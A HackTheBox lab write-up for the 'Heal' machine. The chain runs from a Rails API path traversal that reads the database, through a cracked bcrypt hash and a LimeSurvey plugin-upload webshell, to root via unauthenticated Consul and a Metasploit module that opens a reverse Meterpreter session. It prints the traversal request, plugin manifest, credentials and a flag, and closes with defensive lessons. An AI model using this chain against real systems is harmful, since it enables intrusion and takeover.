---
title: "Heal"
date: 2024-12-14
type: docs
tags:
  - htb
  - linux
  - medium
  - vhost-fuzzing
  - rails
  - path-traversal
  - lfi
  - sqlite
  - bcrypt
  - hashcat
  - limesurvey
  - plugin-rce
  - password-reuse
  - consul
  - hashicorp
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 22.04), **Difficulty:** Medium, **Released:** 2024-12-14, **IP:** `10.10.11.46` , `heal.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. `heal.htb` (React front end) talks to `api.heal.htb` (Rails). A vhost sweep also finds `take-survey.heal.htb` (LimeSurvey) later. The resume export endpoint `GET /download?filename=` on the API is **path traversal**, so read `config/database.yml` then the SQLite DB.
2. The `users` table has a **bcrypt** hash. `hashcat -m 3200` cracks it to `147258369`. The same email and password log into the **LimeSurvey admin** at `take-survey.heal.htb/index.php/admin`.
3. LimeSurvey admin lets you install a **plugin** from a zip. Upload `config.xml` plus `shell.php`, get RCE as `www-data`.
4. `limesurvey/application/config/config.php` has the DB password `AdmiDi0_pA$$w0rd`, reused by the user **`ron`**. SSH in.
5. An internal **HashiCorp Consul** agent on `127.0.0.1:8500` has no ACLs. Register a service whose health check runs a command, and Consul executes it as **root**.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| LimeSurvey admin (cracked bcrypt) | `ralph@heal.htb : 147258369` |
| `ron` (LimeSurvey `config.php`) | `AdmiDi0_pA$$w0rd` |
| `user.txt` | `/home/ron/user.txt` |
| `root.txt` | `/root/root.txt` , `30ed1e88fd2c4832194f69f78a4cd33b` |

</div>

---

## Overview

Heal is what I'd call a "follow the subdomains" box: four separate applications sitting behind one nginx front end, and most of the actual work is figuring out which one to attack and in what order rather than finding some single flashy bug. The API path traversal took me a bit to find precisely because it's gated behind normal application usage: the vulnerable route doesn't exist until you register an account and generate a resume PDF, so a plain unauthenticated scan of `api.heal.htb` comes back looking clean. Once I had that traversal, the rest of the chain fell into a rhythm I've seen before on other boxes: crack a hash, reuse it somewhere else, land in an admin panel, and turn that admin panel into code execution. The LimeSurvey step is a well-documented pattern I already had some familiarity with: LimeSurvey performs no signature check or code review on plugin zips uploaded through its admin panel, so "install plugin" is functionally "upload PHP and run it" for anyone holding those credentials. The privilege escalation, though, is the part of this box I'd actually recommend to someone studying internal service enumeration: **HashiCorp Consul running its default configuration ships with no authentication at all**, and its service registration API lets you attach a `script` health check to a fake service definition. Whoever runs the Consul agent effectively runs your command too, and on this box that's root.

Related vhost fuzz boxes: [Analytics](/writeups/hackthebox/linux/easy/analytics/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Stocker](/writeups/hackthebox/linux/easy/stocker/). Related Rails / path traversal: [Inject](/writeups/hackthebox/linux/easy/inject/), [Bagel](/writeups/hackthebox/linux/medium/bagel/). Related "internal service with no auth to root": [Bolt](/writeups/hackthebox/linux/medium/bolt/) (Passbolt is different), see [Monitored](/writeups/hackthebox/linux/medium/monitored/) and [PC](/writeups/hackthebox/linux/easy/pc/) for the tunnel pattern.

---

## Full Walkthrough

### Nmap scan

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    nginx 1.18.0 (Ubuntu)   (X-Powered-By: Express)
```

### Vhost fuzzing

With only SSH and HTTP open, and an `X-Powered-By: Express` header showing up despite nginx sitting in front, I suspected there was more happening behind the scenes than a single vhost would explain. Before touching the front end at all, I ran a Host-header fuzz to see what else might be hiding:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -H "Host: FUZZ.heal.htb" -u http://heal.htb/ --fs 178
```

```console
api                     [Status: 200, Size: 12515, Words: 469, Lines: 91]
```

That turned up an `api` vhost that wasn't linked from anywhere on the main site, which made it the obvious next stop.

### Path traversal in the API resume export

Hitting `api.heal.htb` directly and unauthenticated returned nothing useful, which told me the interesting functionality was locked behind a session rather than missing entirely. So I registered a normal account on the front end and worked through what a logged-in user could actually do. One feature stood out immediately: generating a resume as a downloadable PDF. Whenever an application lets me name or reference a file for download, path traversal is the first thing I test for, and this one didn't disappoint. The `filename` parameter on the download endpoint had no sanitization at all, which meant I could walk out of the intended directory and pull arbitrary files off the box:

```http
GET /download?filename=../../config/database.yml HTTP/1.1
Host: api.heal.htb
Authorization: Bearer <token>
```

```yaml
default: &default
  adapter: sqlite3
development:
  <<: *default
  database: storage/development.sqlite3
production:
  <<: *default
  database: storage/development.sqlite3
```

<div class="callout callout-note">

**Rails, path traversal, and where the DB lives**

Piecing together the behavior, the export handler is almost certainly built around something like `send_file(File.join(RESUMES_DIR, params[:filename]))`, with no check anywhere for `..` sequences in the supplied path. `File.join` in Ruby doesn't care whether the resulting path stays inside the intended directory, it just concatenates path segments, so feeding it `../../` walks straight out of `RESUMES_DIR`. Reading `config/database.yml` told me exactly what I needed next: the application runs on **SQLite**, and the database file lives at `storage/development.sqlite3`, the development path, still in active use in what's supposed to be a production deployment. That's a misconfiguration I run into more often than you'd expect: someone copies the default Rails config and never swaps the production database settings before shipping. With the path confirmed, I used the same traversal trick to pull the SQLite file itself down to my own machine, where I could query it locally with the `sqlite3` CLI instead of fighting the traversal one row at a time.

</div>

```bash
sqlite3 development.sqlite3 'select email, password_digest from users'
```

That query handed me a full row from the `users` table, including an email address and a bcrypt password hash. Bcrypt is slow by design, which normally makes cracking painful, but a weak or short underlying password still falls quickly even against a deliberately slow algorithm. I fed the hash to `hashcat` in bcrypt mode and let a dictionary attack run:

```console
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
```

With the plaintext password cracked, I went back to the front end to see where else those credentials might be useful, and one of the site's own links pointed me straight at the answer: clicking "take a survey" redirected to a `take-survey` subdomain I hadn't fuzzed my way onto yet, running LimeSurvey. Given that this box had already trained me to expect credential reuse across its various apps, trying the same email and cracked password against the LimeSurvey admin login at `http://take-survey.heal.htb/index.php/admin` was the obvious next move, and it worked.

### LimeSurvey plugin RCE

Once inside the admin panel, I started looking for anything that would get code running on the server rather than just exposing survey data. LimeSurvey's plugin management stood out right away, since installing a plugin is, by definition, installing new server-side code. A bit of research into how LimeSurvey packages plugins showed me that a plugin is nothing more than a zip file containing a `config.xml` manifest plus whatever PHP the plugin needs. I built a minimal `config.xml` based on LimeSurvey's own documented plugin structure, dropped a `shell.php` webshell alongside it, zipped the two together, and uploaded the archive through the plugin installer:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>baphometpwn</name>
        <type>plugin</type>
        <version>5.0</version>
    </metadata>
    <compatibility><version>6.6.4</version></compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

<div class="callout callout-note">

**Why LimeSurvey plugin upload is RCE**

This works so cleanly because LimeSurvey installs plugins straight from an uploaded zip with **no signature verification and no code review** of any kind; the platform simply trusts that anyone holding admin credentials is meant to be trusted with arbitrary PHP execution. The `config.xml` manifest only needs three things to pass validation: a `name`, a `type` of `plugin`, and a `compatibility` version matching whatever LimeSurvey build is actually running (I checked the version in the admin footer, which showed 6.x here). Whatever `.php` files sit alongside that manifest in the zip get extracted to `upload/plugins/<name>/`, a path that's directly web-reachable, so simply browsing to `shell.php` executes it in the context of the web server user, `www-data`. This isn't some novel discovery on my part either: admin-to-RCE via plugin upload has been LimeSurvey's known weak point for years, documented across multiple CVEs and public exploit-db entries.

</div>

With the zip accepted and the plugin installed, I browsed directly to `shell.php` under the plugin's upload path and had command execution as `www-data`.

### www-data to ron

My usual next step after landing a shell is running `linpeas` to automate the tedious parts of enumeration, but it kept crashing under this particular `www-data` shell, likely some environment quirk I didn't bother chasing down since a faster path was already in front of me. Rather than fight the tooling, I went straight to LimeSurvey's own configuration file, since any application talking to a database has to store those credentials somewhere on disk. `/var/www/limesurvey/application/config/config.php` gave up the database password, `AdmiDi0_pA$$w0rd`, in plaintext. I tried it first against `ralph`, the account tied to the LimeSurvey credentials I'd already cracked, but that failed. It worked, though, for a different local account, **`ron`**, which told me the DB password had been reused for a real system login rather than just the LimeSurvey admin account. Once I was `ron`, `linpeas` ran fine without whatever had been tripping it up as `www-data`.

While I was there, I also pulled up the nginx configuration out of curiosity, which confirmed the architecture I'd already pieced together from the outside: `api.heal.htb` reverse-proxies to a Rails application listening on `127.0.0.1:3001`, and `take-survey.heal.htb` serves the LimeSurvey PHP application directly.

### Privilege Escalation, Consul unauthenticated exec

For privilege escalation I started by checking what was only listening on localhost, since that's usually where the genuinely interesting internal services hide on boxes like this. Something was bound to `8500` that wasn't reachable from outside, so I tunneled it back to my own machine over the SSH session I already had:

```bash
ssh -L 8500:localhost:8500 ron@heal.htb
```

Hitting the forwarded port gave the service away immediately.

Port `8500` is a **HashiCorp Consul** HTTP API (`Invalid URL path: ... ensure the path starts with '/v1/'`, redirect to `/ui/`).

<div class="callout callout-note">

**Consul service exec as root**

This is a misconfiguration I actively check for whenever I find Consul on an internal network, because the default install is dangerous straight out of the box: a Consul agent running its default configuration has **no ACL system enabled at all**, meaning any client that can reach `:8500` can register a brand-new service by sending a `PUT` to `/v1/agent/service/register`, no authentication required. If that agent also has `enable_script_checks` (or `enable_local_script_checks`) turned on, which is common since plenty of operational tooling depends on it, a service definition can include a health check of type `script` with an `args` array naming a command to run. Consul executes that command on its own scheduled interval, and critically, it runs **as whatever user the agent process runs as**, which on this box is root. Rather than hand-craft the registration payload myself, I reached for Metasploit's `exploit/multi/misc/consul_service_exec` module, which automates exactly this sequence: register a malicious service, wait for the scheduled check to fire, and clean up once the payload has executed.

</div>

```console
msf6 exploit(multi/misc/consul_service_exec) > set rhosts 127.0.0.1
msf6 exploit(multi/misc/consul_service_exec) > set lhost tun0
msf6 exploit(multi/misc/consul_service_exec) > run
[*] Service 'sRlPeuRwOG' successfully created.
[*] Meterpreter session 1 opened
meterpreter > shell
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
30ed1e88fd2c4832194f69f78a4cd33b
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/ron/user.txt` |
| `root.txt` | `/root/root.txt` , `30ed1e88fd2c4832194f69f78a4cd33b` |

---

## Lessons and Takeaways

- **Fuzz every subdomain before assuming you've mapped the whole application.** Heal runs four distinct applications behind one front door, and the two that mattered most, `api` and `take-survey`, are never linked from the main page. Testing only what's visible in the UI would have missed the entire attack surface.
- **`send_file` combined with unsanitized user input is path traversal in Rails, exactly the same way it is everywhere else.** `File.join` doesn't enforce that the result stays within a base directory, it just glues path segments together. The fix is to resolve the final path with something like `Rails.root.join` against a fixed, known-safe base, explicitly reject any `..` segments, and ideally compare the resolved absolute path against an allowlist before the filesystem ever gets touched.
- **Never let a development database configuration reach production.** Running SQLite against a `development.sqlite3` file in production isn't just sloppy naming, it usually also means weaker file permissions and less operational rigor around backups and access control than a properly provisioned production database would get. Keep `database.yml` unreadable by anything other than the application's own service account.
- **Patch LimeSurvey aggressively, and gate plugin installation behind a break-glass process.** "Install plugin from zip" is, in practice, "upload and execute arbitrary PHP," and it deserves the same access controls and audit trail as any other remote code execution capability, not the casual access an admin panel implies.
- **Enable Consul ACLs (`acl.default_policy = "deny"`) and disable `enable_script_checks` unless something explicitly depends on it.** An unauthenticated Consul agent API is functionally equivalent to a root shell on the host it runs on, and that's true the instant anyone, insider or attacker, can reach the port.
- **Enforce unique passwords across every service a system talks to.** The database password reused for `ron`'s SSH login is what turned a web application compromise into a full system foothold; without that reuse, `www-data` would have been a dead end instead of a stepping stone.

---

## Related Writeups

- **Vhost / subdomain fuzzing:** [Analytics](/writeups/hackthebox/linux/easy/analytics/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Stocker](/writeups/hackthebox/linux/easy/stocker/)
- **Path traversal to a DB file to a hash crack:** [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)
- **Admin panel plugin/theme upload to RCE:** [Blocky](/writeups/hackthebox/linux/easy/blocky/), [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Usage](/writeups/hackthebox/linux/easy/usage/)
- **Internal service, tunnel, exploit to root:** [Monitored](/writeups/hackthebox/linux/medium/monitored/), [PC](/writeups/hackthebox/linux/easy/pc/), [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)

## References

- LimeSurvey RCE via plugin (EDB 49318) <https://www.exploit-db.com/exploits/49318>
- Consul remote command execution <https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations>
- Metasploit consul_service_exec <https://www.rapid7.com/db/modules/exploit/multi/misc/consul_service_exec/>
- hashcat mode 3200 (bcrypt) <https://hashcat.net/wiki/doku.php?id=example_hashes>
